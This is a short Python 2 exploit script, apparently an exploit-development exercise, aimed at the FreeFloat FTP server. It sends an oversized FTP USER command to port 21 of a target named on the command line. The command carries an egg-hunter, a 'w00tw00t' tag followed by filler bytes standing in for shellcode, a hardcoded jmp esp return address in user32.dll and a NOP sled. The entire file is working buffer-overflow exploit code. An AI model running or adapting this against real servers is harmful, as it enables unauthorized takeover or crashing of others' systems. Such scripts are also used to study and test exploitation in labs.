#! /usr/bin/python 
# Name: Rio Atmadja
# Program: Exploit Development freefloatftp 

import sys
import socket 

def fuzzing(hostname):

	shellcode = ( "w00tw00t" + '\x44' * 368 ) 
	egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
	"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" )

	#evil_buff = '\x90' * 246
	jmp_esp = "\x53\x93\x42\x7E"  #7e429353 jmp esp ( user32.dll ) 
	nopsled = "\x90" * 342

	password = "user"
	username = shellcode +  egghunter + jmp_esp + nopsled 
	connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		#connect to the host 
		connect.connect((hostname, 21))

	except:

		print "[-] Connection Error"
		response = connect.recv(2000)
		print response
		sys.exit(1)

	#send username to the server 
	connect.send("user %s\r\n" %username)
	response = connect.recv(2000)
	#print response 

	#send password to the server 
	connect.send("pass %s\r\n" %password)
	response = connect.recv(2000)
	#print response 

	connect.close()
	print "[+] Sending Evil Username " + str(len(username)) + " Bytes "
	print "[+] Exploit Sent Successfully"
        print "\r"

if __name__ == '__main__':
	try:
		target = sys.argv[1]

	except IndexError:
		print 'Usage: %s <target> ' % sys.argv[0]
		sys.exit(-1)
	
	fuzzing(target)

